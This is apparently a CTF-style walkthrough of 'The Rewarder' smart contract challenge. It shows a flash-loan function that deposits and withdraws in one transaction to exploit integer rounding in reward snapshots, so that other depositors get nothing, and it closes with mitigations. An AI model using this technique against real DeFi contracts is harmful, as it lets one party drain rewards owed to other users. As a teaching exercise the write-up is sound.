# Challenge #5: The Rewarder

There is a pool that send rewards to those who deposit their token to increase the liquidity of the pool. The rewards are distributed every 5 days. Our goal is to deprive the other users, who already deposited their liquidity tokens, of the rewards. 

The description mentions that there is another pool with a lot of tokens that offers flash loans.

Here is the function that distributes the rewards and can be called by anyone to get their reward:
```
function distributeRewards() public returns (uint256) {
        uint256 rewardInWei = 0;

        if(isNewRewardsRound()) {
            _recordSnapshot();
        }        
        
        uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (totalDeposits > 0) {
            uint256 reward = (amountDeposited * 100) / totalDeposits;

            if(reward > 0 && !_hasRetrievedReward(msg.sender)) {                
                rewardInWei = reward * 10 ** 18;
                rewardToken.mint(msg.sender, rewardInWei);
                lastRewardTimestamps[msg.sender] = block.timestamp;
            }
        }

        return rewardInWei;     
    }
```

Things to notice:
1. The reward token has as many decimals as ETH - 18. 
2. The amount of reward token to get is the percent value of deposited tokens.
3. The contribution (variable *reward*) is calculated as a percent value without decimal precision.
3. The amount of reward token to be transferred (variable *rewardInWei*) equals the percent value multiplied by 10**18. 

A hint: whenever you see a division operations, double check the possible rounding errors!

## Exploit

When the attack starts 4 users have already deposited a total of 400 tokens and got 25 reward tokens each in the previous round.

If I deposited another 100 tokens I would get 20 reward tokens - same as every other user, except that they would have 25+20=45 tokens after the second round. In order to deprive them of the reward tokens in the next round, and get as much as possible of all 100 tokens distributed in one round, I have to deposit so many tokens that the rewards for 100 deposited token (by other users) would become 0. 

The reward is calculated as follows (all operations are done within the integer type, not float):

```
(amountDeposited * 100) / totalDeposits
```

I can borrow the maximum of 1000000 tokens in a flash loan from another pool. Here is the simple code of the attack:

```
function receiveFlashLoan(uint256 amount) external {
    liquidityToken.approve(address(rewarder), amount);
    rewarder.deposit(amount);

    rewarder.withdraw(amount);
    liquidityToken.transfer(address(lender), amount);
}
```

I basically:
1. deposit borrowed tokens (the *distributeTokens* function is called automatically when the *deposit* function is called) and then ...
2. withdraw them. 
All done in one flash-loan transaction.

Let's check what is my reward:

```
((1000000 * 100) * 10**18) / ((1000000 + 400) * 10**18) = 99 
```

I would get the 99 of 100 total tokens distributed. Let's now check how many reward tokens would get each other user who deposited 100 liquidity tokens:

```
((100 * 100) * 10**18) / ((1000000 + 400) * 10**18) = 0  
```

You may ask why I include my deposit to calculate the rewards of other users while it is already withdrawn. 

The catch is that the liquidity token snapshot is taken every 5 days (for each round) when someone deposits some tokens. It means that my deposited loan is included until the next round is started. That is why it is taken into account when the other users want to get their rewards in further transactions.

And remember that I can repeat this attack for every round... ;)

## Lesson learned

This example of vulnerable contract shows that it is very important to perform the math operations (especially the division operation) with the highest possible precision. 

In case of a token of the same number of decimals as ETH - 18 - all operations should be performed including 18 decimals. In this particular contract the share was calculated without decimals at all.

Let's see what would be the reward of other users if the contract calculated it with the 18 decimals precision (in wei) using the following formula:

```
uint256 rewardInWei = (amountDeposited * 100 * 10 ** 18) / totalDeposits;
```

```
((100 * 10**18 * 100) * 10**18) / ((1000000 + 400) * 10**18) = 9996001599360255 wei tokens = 0.009996001599360255 tokens
```

As you can see it is not zero anymore. It is small amount but it reflects the real share of the user.

Additionally, to mitigate the momentary fluctuations in shares that impact the distribution of rewards, the rewarder contract should not allow to calculate and distribute rewards within the same function call that deposits tokens (the distribution function should be defined as non reentrant).

[<< Back to the README](../README.md)